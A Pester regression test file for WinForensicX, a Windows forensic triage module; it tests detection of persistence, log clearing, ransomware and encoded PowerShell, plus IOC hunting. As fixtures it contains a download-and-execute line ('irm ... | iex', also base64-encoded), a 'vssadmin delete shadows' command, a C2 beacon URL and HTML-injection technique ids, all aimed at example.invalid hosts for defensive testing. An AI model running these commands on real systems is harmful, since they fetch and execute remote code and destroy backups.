# Regression tests for v2.1 fixes and features. Pester 4/5 compatible; runs on any OS (no live collection).
$here = Split-Path -Parent $PSCommandPath
$root = Split-Path -Parent $here
$mod = Join-Path $root 'WinForensicX'
foreach ($layer in 'Private', 'Analyzers', 'Collectors', 'Report', 'Public') {
    foreach ($f in Get-ChildItem (Join-Path $mod $layer) -Filter *.ps1 | Sort-Object Name) { . $f.FullName }
}
$script:WfxRuleRoot = Join-Path $mod 'Rules'
$script:WfxModuleRoot = $mod
$script:WfxQuiet = $true

function Find-Id { param($Findings, $Id) @($Findings | Where-Object { $_.Id -eq $Id }) }
function New-TestDir { $d = Join-Path ([IO.Path]::GetTempPath()) ('wfxt_' + [guid]::NewGuid().ToString('N').Substring(0, 8)); New-Item -ItemType Directory -Path $d | Out-Null; $d }
function New-Ev { param($Id, $Log, $Time, $Fields, $Msg = '') [pscustomobject]@{ Log = $Log; Id = $Id; TimeCreated = (ConvertTo-WfxUtcString $Time); Message = $Msg; Fields = $Fields } }

Describe 'Engine resilience and chain of custody' {
    It 'completes analysis with a gap when a rule pack is missing (E-1)' {
        $saveRoot = $script:WfxRuleRoot; $saveCache = $script:WfxRuleCache
        try {
            $script:WfxRuleRoot = New-TestDir; $script:WfxRuleCache = @{}
            $b = [pscustomobject]@{ HostName = 'H'; Process = @([pscustomobject]@{ Pid = 1; Name = 'cmd.exe'; Path = 'C:\Windows\System32\cmd.exe'; CommandLine = 'cmd /c whoami' }) }
            $r = Invoke-WfxAnalyze -Bundle $b -AllowlistPath ''
            $r | Should -Not -BeNullOrEmpty
            @($r.Gaps | Where-Object { $_.Source -eq 'analyzer:process' }).Count | Should -Be 1
        } finally { $script:WfxRuleRoot = $saveRoot; $script:WfxRuleCache = $saveCache }
    }
    It 'closes a case so later commands cannot alter its audit log (F-1)' {
        $out = New-TestDir
        $case = New-WfxCase -OutputPath $out -Name 't' -HostName 'H' -Mode 'local'
        'x' | Set-Content (Join-Path $case.Path 'result.json')
        $mp = Complete-WfxCase
        $m = Get-Content $mp -Raw | ConvertFrom-Json
        $m.schema | Should -Be 'winforensicx.manifest/2'
        $m.toolIntegrity.combinedSha256 | Should -Match '^[0-9a-f]{64}$'
        $before = ($m.files | Where-Object path -eq 'audit.log').sha256
        Add-WfxGap -Source 'later' -Reason 'a later command'
        (Get-FileHash (Join-Path $case.Path 'audit.log') -Algorithm SHA256).Hash.ToLower() | Should -Be $before
        $script:WfxCase | Should -BeNullOrEmpty
    }
    It 'rejects malformed rules from a custom pack instead of trusting them' {
        $d = New-TestDir
        '{"rules":[{"id":"BAD-1","pattern":"x","technique":["T1059\" onclick=\"x"],"severity":"High"},{"id":"OK-1","pattern":"zzqqzz","technique":["T1059"],"severity":"Low"}]}' | Set-Content (Join-Path $d 'lotl.test.json')
        Clear-WfxGap; Set-WfxRulePath $d
        try {
            $p = Get-WfxRulePack lotl
            @($p.rules | Where-Object id -eq 'BAD-1').Count | Should -Be 0
            @($p.rules | Where-Object id -eq 'OK-1').Count | Should -Be 1
            @(Get-WfxGap | Where-Object { $_.Reason -match 'BAD-1|invalid ATT&CK' }).Count | Should -BeGreaterThan 0
        } finally { Set-WfxRulePath '' }
    }
    It 'drops malformed technique ids at the finding level (F-4)' {
        $f = New-WfxFinding -Id X -Title t -Category c -Technique @('T1059', 'T1"><img src=x>', 'T1003.001')
        @($f.Technique) -join ',' | Should -Be 'T1059,T1003.001'
    }
    It 'normalizes timestamps to UTC ISO strings, including legacy /Date()/ values' {
        ConvertTo-WfxUtcString '/Date(0)/' | Should -Be '1970-01-01T00:00:00.000Z'
        ConvertTo-WfxUtcString ([datetime]::new(2026, 1, 2, 3, 4, 5, [DateTimeKind]::Utc)) | Should -Be '2026-01-02T03:04:05.000Z'
        ConvertTo-WfxUtcString '2026-01-02T05:04:05+02:00' | Should -Be '2026-01-02T03:04:05.000Z'
    }
    It 'suppresses allowlisted findings but reports them separately' {
        $d = New-TestDir; $al = Join-Path $d 'allow.json'
        '[{"Id":"PERSIST-*","Entity":"autostart:RunKey:Corp*","Reason":"corporate agent"}]' | Set-Content $al
        $b = [pscustomobject]@{ HostName = 'H'; Persistence = @([pscustomobject]@{ Kind = 'RunKey'; Name = 'CorpAgent'; Command = 'C:\Users\Public\agent.exe'; Path = 'C:\Users\Public\agent.exe'; SignatureStatus = 'NotSigned' }) }
        $r = Invoke-WfxAnalyze -Bundle $b -AllowlistPath $al
        @($r.Findings | Where-Object Id -like 'PERSIST-*').Count | Should -Be 0
        @($r.Suppressed).Count | Should -Be 1
        $r.Suppressed[0].Reason | Should -Be 'corporate agent'
    }
}

Describe 'False-positive control on a clean host (E-2)' {
    It 'scores a default Windows 11 host as low compromise risk' {
        $conns = foreach ($a in '0.0.0.0', '::') { foreach ($p in 135, 445, 5040, 7680, 49664, 49665, 49666, 49667, 49668, 49669) { [pscustomobject]@{ Protocol = 'TCP'; LocalAddress = $a; LocalPort = $p; State = 'Listen'; Pid = 900; Process = $(if ($p -ge 49664) { 'lsass' } else { 'svchost' }) } } }
        $dp = 'C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0'
        $persist = @(
            [pscustomobject]@{ Kind = 'Service'; Name = 'WinDefend'; Command = "`"$dp\MsMpEng.exe`""; Path = "$dp\MsMpEng.exe"; SignatureStatus = 'Valid' }
            [pscustomobject]@{ Kind = 'ScheduledTask'; Name = '\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan'; Command = "$dp\MpCmdRun.exe Scan -ScheduleJob"; Path = "$dp\MpCmdRun.exe"; SignatureStatus = 'Valid' }
            [pscustomobject]@{ Kind = 'RunKey'; Name = 'OneDrive'; Command = '"C:\Users\bob\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background'; Path = 'C:\Users\bob\AppData\Local\Microsoft\OneDrive\OneDrive.exe'; SignatureStatus = 'Valid' }
        )
        $r = Invoke-WfxAnalyze -Bundle ([pscustomobject]@{ HostName = 'H'; Network = $conns; Persistence = $persist }) -AllowlistPath ''
        $r.Risk.Score | Should -BeLessThan 20
        @($r.Findings | Where-Object { $_.Severity -in 'Medium', 'High', 'Critical' }).Count | Should -Be 0
    }
    It 'still flags an unsigned Run-key binary in AppData and a non-default listener' {
        $r = Invoke-WfxAnalyze -Bundle ([pscustomobject]@{ HostName = 'H'
                Persistence = @([pscustomobject]@{ Kind = 'RunKey'; Name = 'upd'; Command = 'C:\Users\bob\AppData\Roaming\upd\upd.exe'; Path = 'C:\Users\bob\AppData\Roaming\upd\upd.exe'; SignatureStatus = 'NotSigned' })
                Network = @([pscustomobject]@{ Protocol = 'TCP'; LocalAddress = '0.0.0.0'; LocalPort = 31337; State = 'Listen'; Pid = 4242; Process = 'upd' }) }) -AllowlistPath ''
        (Find-Id $r.Findings 'PERSIST-RUNKEY-SUSPECT').Count | Should -Be 1
        (Find-Id $r.Findings 'NET-LISTENER-EXPOSED').Count | Should -Be 1
    }
    It 'scores posture separately from compromise' {
        $posture = [pscustomobject]@{ Defender = [pscustomobject]@{ Installed = $true; RealTimeProtectionEnabled = $true; AntivirusEnabled = $true; TamperProtectionEnabled = $false; SignatureAgeDays = 1 }
            Audit = [pscustomobject]@{ ProcessCreation = $false; CommandLineInProcessCreation = $false; ScriptBlockLogging = $false; SysmonInstalled = $false }; Lsa = [pscustomobject]@{ RunAsPPL = $false; CredentialGuard = $false } }
        $r = Invoke-WfxAnalyze -Bundle ([pscustomobject]@{ HostName = 'H'; Security = $posture }) -AllowlistPath ''
        $r.Risk.Score | Should -Be 0
        $r.Posture.Score | Should -BeGreaterThan 0
    }
}

Describe 'Analyzer bug fixes' {
    It 'does not report a correctly-ACLed hive copy as readable (E-3)' {
        $xf = Invoke-WfxExposureAnalyzer -Exposure @([pscustomobject]@{ Kind = 'SensitiveHive'; Path = 'C:\Windows.old\Windows\System32\config\SAM'; Detail = 'SAM hive in Windows.old'; Accessible = $false })
        (Find-Id $xf 'EXPO-HIVE-ACCESS').Count | Should -Be 0
        (Find-Id $xf 'EXPO-HIVE-COPY').Count | Should -Be 1
    }
    It 'flags a live hive readable by Users as Critical (HiveNightmare)' {
        $xf = Invoke-WfxExposureAnalyzer -Exposure @([pscustomobject]@{ Kind = 'SensitiveHive'; Path = 'C:\Windows\System32\config\SAM'; Detail = 'SAM hive'; Accessible = $true; Live = $true })
        (Find-Id $xf 'EXPO-HIVE-ACCESS')[0].Severity | Should -Be 'Critical'
    }
    It 'only correlates failures that happened BEFORE the success (E-5)' {
        $t0 = [datetime]::new(2026, 11, 1, 10, 0, 0, [DateTimeKind]::Utc)
        $after = @(New-Ev 4624 'Security' $t0 @{ TargetUserName = 'alice'; IpAddress = '203.0.113.7'; LogonType = '3' }) + @(1..10 | ForEach-Object { New-Ev 4625 'Security' $t0.AddMinutes($_) @{ TargetUserName = 'alice'; IpAddress = '203.0.113.7'; LogonType = '3' } })
        (Find-Id (Invoke-WfxEventAnalyzer -Event $after) 'EVT-4625-THEN-4624').Count | Should -Be 0
        $before = @(1..10 | ForEach-Object { New-Ev 4625 'Security' $t0.AddMinutes(-$_) @{ TargetUserName = 'alice'; IpAddress = '203.0.113.7'; LogonType = '3' } }) + @(New-Ev 4624 'Security' $t0 @{ TargetUserName = 'alice'; IpAddress = '203.0.113.7'; LogonType = '3' })
        (Find-Id (Invoke-WfxEventAnalyzer -Event $before) 'EVT-4625-THEN-4624').Count | Should -Be 1
    }
    It 'reports Defender malware detections (1116/1117)' {
        $ev = @(New-Ev 1116 'Microsoft-Windows-Windows Defender/Operational' (Get-Date) @{ 'Threat Name' = 'Trojan:Win32/Test'; Path = 'C:\Users\bob\Downloads\a.exe' } 'Microsoft Defender Antivirus has detected malware')
        (Find-Id (Invoke-WfxEventAnalyzer -Event $ev) 'EVT-DEFENDER-DETECTION').Count | Should -Be 1
    }
    It 'matches rules on log name too (no "log cleared" from an Application event 104) (E-16)' {
        $ev = @(New-Ev 104 'Application' (Get-Date) @{ SubjectUserName = 'x' })
        (Find-Id (Invoke-WfxEventAnalyzer -Event $ev) 'EVT-104-CLEARED').Count | Should -Be 0
        $ev = @(New-Ev 104 'System' (Get-Date) @{ SubjectUserName = 'x' })
        (Find-Id (Invoke-WfxEventAnalyzer -Event $ev) 'EVT-104-CLEARED').Count | Should -Be 1
    }
    It 'reassembles split 4104 script blocks before matching' {
        $t = Get-Date; $id = [guid]::NewGuid().ToString()
        $ev = @(
            New-Ev 4104 'Microsoft-Windows-PowerShell/Operational' $t @{ ScriptBlockId = $id; MessageNumber = '1'; MessageTotal = '2'; ScriptBlockText = 'irm https://example.invalid/t.txt ' }
            New-Ev 4104 'Microsoft-Windows-PowerShell/Operational' $t @{ ScriptBlockId = $id; MessageNumber = '2'; MessageTotal = '2'; ScriptBlockText = '| iex' }
        )
        (Find-Id (Invoke-WfxEventAnalyzer -Event $ev) 'LOTL-PS-DOWNLOAD-EXEC').Count | Should -Be 1
    }
    It 'runs command-line rules over Sysmon Event 1' {
        $ev = @(New-Ev 1 'Microsoft-Windows-Sysmon/Operational' (Get-Date) @{ Image = 'C:\Windows\System32\vssadmin.exe'; CommandLine = 'vssadmin delete shadows /all /quiet'; ParentImage = 'C:\Windows\System32\cmd.exe' })
        (Find-Id (Invoke-WfxEventAnalyzer -Event $ev) 'LOTL-SHADOW-DELETE').Count | Should -Be 1
    }
    It 'fires "no AV" when Defender status is unreadable and no other AV is registered (E-9)' {
        (Find-Id (Invoke-WfxPostureAnalyzer -Posture ([pscustomobject]@{ Defender = $null; ThirdPartyAV = @() })) 'POSTURE-NO-AV').Count | Should -Be 1
    }
    It 'treats unknown process auditing as unknown, not "off" (E-12)' {
        $p = [pscustomobject]@{ Audit = [pscustomobject]@{ ProcessCreation = $null; CommandLineInProcessCreation = $true; ScriptBlockLogging = $true; SysmonInstalled = $false }; ThirdPartyAV = @('X') }
        (Find-Id (Invoke-WfxPostureAnalyzer -Posture $p) 'POSTURE-NO-PROCESS-AUDIT').Count | Should -Be 0
    }
    It 'keeps one finding per secret environment variable (E-10)' {
        $xe = Invoke-WfxExposureAnalyzer -Exposure @(
            [pscustomobject]@{ Kind = 'SecretInEnv'; Path = 'env:User:DB_PASSWORD'; Detail = 'DB_PASSWORD'; Redacted = @('x') }
            [pscustomobject]@{ Kind = 'SecretInEnv'; Path = 'env:User:STRIPE_SECRET'; Detail = 'STRIPE_SECRET'; Redacted = @('y') })
        @($xe).Count | Should -Be 2
    }
    It 'ignores the parent name when the PID was reused (E-17)' {
        $p = @([pscustomobject]@{ Pid = 600; Name = 'lsass.exe'; Path = 'C:\Windows\System32\lsass.exe'; CommandLine = 'C:\Windows\system32\lsass.exe'; ParentName = 'chrome.exe'; CreateTime = '2026-11-01T08:00:00.000Z'; ParentCreateTime = '2026-11-01T09:00:00.000Z'; SignatureStatus = 'Valid' })
        (Find-Id (Invoke-WfxProcessAnalyzer -Process $p) 'PROC-PARENT-SPOOF').Count | Should -Be 0
    }
    It 'decodes encoded PowerShell and detects what is inside it' {
        $inner = 'irm https://example.invalid/t.txt | iex'
        $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner))
        $pf = Invoke-WfxProcessAnalyzer -Process @([pscustomobject]@{ Pid = 7; Name = 'powershell.exe'; Path = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; CommandLine = "powershell -nop -enc $b64"; SignatureStatus = 'Valid' })
        @($pf | Where-Object { $_.Id -eq 'LOTL-PS-DOWNLOAD-EXEC' -and $_.Title -match 'inside encoded' }).Count | Should -Be 1
        (Find-Id $pf 'PROC-ENCODED-DECODED')[0].Evidence.DecodedCommand | Should -Match 'example\.invalid'
    }
    It 'names connections from the DNS cache (no live reverse lookups) (F-3)' {
        $dns = @([pscustomobject]@{ Name = 'abc.trycloudflare.com'; Type = '1'; Data = '198.51.100.20' })
        $b = [pscustomobject]@{ HostName = 'H'; Dns = $dns; Network = @([pscustomobject]@{ Protocol = 'TCP'; LocalAddress = '10.0.0.5'; LocalPort = 50000; RemoteAddress = '198.51.100.20'; RemotePort = 443; State = 'Established'; Pid = 9; Process = 'x' }) }
        (Find-Id (Invoke-WfxAnalyze -Bundle $b -AllowlistPath '').Findings 'NET-TUNNEL-SERVICE').Count | Should -Be 1
    }
    It 'requires a dominant extension across folders for mass encryption, and ignores package formats' {
        $enc = 1..30 | ForEach-Object { [pscustomobject]@{ Path = "C:\Users\u\d$($_ % 4)\f$_.docx.qwerty"; Directory = "C:\Users\u\d$($_ % 4)"; Extension = '.qwerty'; Entropy = 7.9 } }
        (Find-Id (Invoke-WfxRansomwareAnalyzer -RecentFile $enc) 'RANSOM-MASS-ENCRYPT').Count | Should -Be 1
        $pkg = 1..30 | ForEach-Object { [pscustomobject]@{ Path = "C:\Users\u\.nuget\p$_\x.nupkg"; Directory = "C:\Users\u\.nuget\p$_"; Extension = '.nupkg'; Entropy = 7.9 } }
        (Find-Id (Invoke-WfxRansomwareAnalyzer -RecentFile $pkg) 'RANSOM-MASS-ENCRYPT').Count | Should -Be 0
    }
}

Describe 'Hostile-input safety (F-5)' {
    It 'redaction never hangs on crafted input' {
        $crafted = ('password ' * 20000)
        $sw = [Diagnostics.Stopwatch]::StartNew(); $null = Protect-WfxText $crafted; $sw.Elapsed.TotalSeconds | Should -BeLessThan 10
    }
    It 'ransom-note analysis of a crafted 64 KB note is fast' {
        $crafted = ('pay readme contact us ' * 3000).Substring(0, 65536)
        $sw = [Diagnostics.Stopwatch]::StartNew(); $null = Invoke-WfxRansomwareAnalyzer -Note @([pscustomobject]@{ Path = 'x'; Content = $crafted }); $sw.Elapsed.TotalSeconds | Should -BeLessThan 3
    }
}

Describe 'Hunt precision (E-11)' {
    BeforeAll {
        $script:hd = New-TestDir
        $script:hb = Join-Path $script:hd 'bundle.json'
        [pscustomobject]@{ HostName = 'H'
            Network = @([pscustomobject]@{ RemoteAddress = '11.2.3.45'; RemotePort = 443; Process = 'x.exe'; RemoteHost = '' }, [pscustomobject]@{ RemoteAddress = '1.2.3.4'; RemotePort = 80; Process = 'y.exe'; RemoteHost = '' })
            Dns = @([pscustomobject]@{ Name = 'cdn.evil.example'; Data = '1.2.3.4' }, [pscustomobject]@{ Name = 'notevil.example'; Data = '5.6.7.8' })
            Events = @([pscustomobject]@{ Id = 4625; Log = 'Security'; TimeCreated = '2026-11-01T00:00:00.000Z'; Message = ''; Fields = @{ IpAddress = '198.51.100.99' } })
            Files = @([pscustomobject]@{ Path = 'C:\Users\u\a.exe'; SHA256 = ''; MD5 = '44D88612FEA8A8F36DE82E1278ABB02F' })
        } | ConvertTo-Json -Depth 6 | Set-Content $script:hb
    }
    It 'matches IPs exactly' {
        $h = @(Invoke-WfxHunt -Ioc '1.2.3.4' -InputPath $script:hb -NoCase -PassThru)
        @($h | Where-Object { $_.Evidence.Context -match '11\.2\.3\.45' }).Count | Should -Be 0
        @($h | Where-Object { $_.Evidence.Where -eq 'network' }).Count | Should -Be 1
    }
    It 'matches a domain and its subdomains only' {
        $h = @(Invoke-WfxHunt -Ioc 'evil.example' -InputPath $script:hb -NoCase -PassThru)
        @($h | Where-Object { $_.Evidence.Value -match 'notevil' }).Count | Should -Be 0
        @($h | Where-Object { $_.Evidence.Value -match 'cdn\.evil\.example' }).Count | Should -Be 1
    }
    It 'searches event fields and MD5 hashes, and accepts defanged IOCs' {
        @(Invoke-WfxHunt -Ioc '198.51.100[.]99' -InputPath $script:hb -NoCase -PassThru).Count | Should -Be 1
        @(Invoke-WfxHunt -Ioc '44d88612fea8a8f36de82e1278abb02f' -InputPath $script:hb -NoCase -PassThru).Count | Should -Be 1
    }
}

Describe 'Investigator / CTF features' {
    It 'decodes -EncodedCommand, gzip and nested base64 without executing' {
        $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Write-Output 'hello'"))
        (ConvertFrom-WfxEncodedCommand "powershell -enc $b64").Decoded | Should -Be "Write-Output 'hello'"
        $ms = New-Object IO.MemoryStream; $gz = New-Object IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Compress)
        $raw = [Text.Encoding]::UTF8.GetBytes('flag{gzip_layer}'); $gz.Write($raw, 0, $raw.Length); $gz.Dispose()
        $gzb64 = [Convert]::ToBase64String($ms.ToArray())
        (ConvertFrom-WfxEncodedCommand $gzb64).Decoded | Should -Match 'flag\{gzip_layer\}'
        $outer = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("`$x=[Convert]::FromBase64String('$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('flag{nested_layer_two}')))')"))
        $d = ConvertFrom-WfxEncodedCommand "pwsh -e $outer"
        @($d.Layers).Count | Should -Be 2
        $d.Decoded | Should -Be 'flag{nested_layer_two}'
    }
    It 'profiles a file: true type, extension mismatch, strings and IOCs' {
        $d = New-TestDir; $f = Join-Path $d 'holiday.jpg'
        $png = [byte[]](0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A) + [Text.Encoding]::ASCII.GetBytes(" beacon https://c2.example.invalid/gate.php 203.0.113.50 admin@example.org ")
        [IO.File]::WriteAllBytes($f, $png)
        $t = Get-WfxFileTriage -Path $f -Strings
        $t.FileType | Should -Be 'PNG image'
        $t.ExtensionMismatch | Should -BeTrue
        $t.SHA256 | Should -Match '^[0-9A-F]{64}$'
        @($t.Iocs.Urls) -join ' ' | Should -Match 'c2\.example\.invalid'
        @($t.Iocs.IPv4) | Should -Contain '203.0.113.50'
    }
    It 'parses a PE header (machine and compile time)' {
        $d = New-TestDir; $f = Join-Path $d 'tiny.exe'
        $b = New-Object byte[] 512; $b[0] = 0x4D; $b[1] = 0x5A; [BitConverter]::GetBytes([int]0x80).CopyTo($b, 0x3C)
        [BitConverter]::GetBytes([uint32]0x00004550).CopyTo($b, 0x80); [BitConverter]::GetBytes([uint16]0x8664).CopyTo($b, 0x84)
        [BitConverter]::GetBytes([uint32]1700000000).CopyTo($b, 0x88); [BitConverter]::GetBytes([uint16]0x20b).CopyTo($b, 0x98)
        [IO.File]::WriteAllBytes($f, $b)
        $t = Get-WfxFileTriage -Path $f
        $t.PE.Machine | Should -Be 'x64'
        $t.PE.CompiledUtc | Should -Be '2023-11-14T22:13:20.000Z'
    }
    It 'diffs two cases and builds a UTC-sorted timeline' {
        $d = New-TestDir
        $a = Join-Path $d 'a.json'; $c = Join-Path $d 'c.json'
        [pscustomobject]@{ HostName = 'H'; Collected = '2026-11-01T00:00:00.000Z'; Process = @([pscustomobject]@{ Pid = 1; Name = 'svchost.exe'; Path = 'C:\Windows\System32\svchost.exe'; CreateTime = '2026-11-01T00:00:00.000Z' }) } | ConvertTo-Json -Depth 5 | Set-Content $a
        [pscustomobject]@{ HostName = 'H'; Collected = '2026-11-02T00:00:00.000Z'
            Process = @([pscustomobject]@{ Pid = 1; Name = 'svchost.exe'; Path = 'C:\Windows\System32\svchost.exe'; CreateTime = '2026-11-01T00:00:00.000Z' }, [pscustomobject]@{ Pid = 2; Name = 'evil.exe'; Path = 'C:\Users\Public\evil.exe'; CreateTime = '2026-11-01T23:00:00.000Z' })
            Events = @([pscustomobject]@{ Id = 1102; Log = 'Security'; TimeCreated = '2026-11-01T22:00:00.000Z'; Message = 'The audit log was cleared.'; Fields = @{ SubjectUserName = 'bob' } }) } | ConvertTo-Json -Depth 5 | Set-Content $c
        $diff = @(Compare-WfxCase -Baseline $a -Current $c)
        @($diff | Where-Object { $_.Section -eq 'Process' -and $_.Change -eq 'Added' -and $_.Detail -match 'evil\.exe' }).Count | Should -Be 1
        $tl = @(Get-WfxTimeline -InputPath $c)
        $tl.Count | Should -Be 3
        $tl[-1].Summary | Should -Match 'evil\.exe'
        $tl[1].Type | Should -Be 'event-1102'
    }
    It 'sends only collection code to remote hosts' {
        $src = Get-WfxPortableSource
        $src | Should -Match 'function Get-WfxCollectionBundle'
        $src | Should -Not -Match 'function Show-WfxMenu'
        $src | Should -Not -Match 'function New-WfxReport'
    }
}

Describe 'Rule pack integrity' {
    It 'all built-in packs load' { @(Test-WfxRulePackSet).Count | Should -Be 0 }
    It 'every event rule references known ATT&CK ids and valid fields' {
        foreach ($r in (Get-WfxRulePack events).rules) {
            foreach ($t in @($r.technique)) { $script:WfxAttack.ContainsKey($t) | Should -BeTrue -Because "$($r.id) references $t" }
            @($r.eventIds).Count | Should -BeGreaterThan 0
        }
    }
    It 'LotL samples contain no live infrastructure (only reserved example domains)' {
        foreach ($r in (Get-WfxRulePack lotl).rules) {
            foreach ($s in @($r.tests.match) + @($r.tests.nomatch)) {
                foreach ($m in [regex]::Matches($s, '(?i)https?://([^/\s"'']+)')) { $m.Groups[1].Value | Should -Match '(?i)(?:^|\.)example\.(?:invalid|com|org|net)$|^localhost$' -Because "$($r.id) sample: $s" }
            }
        }
    }
}
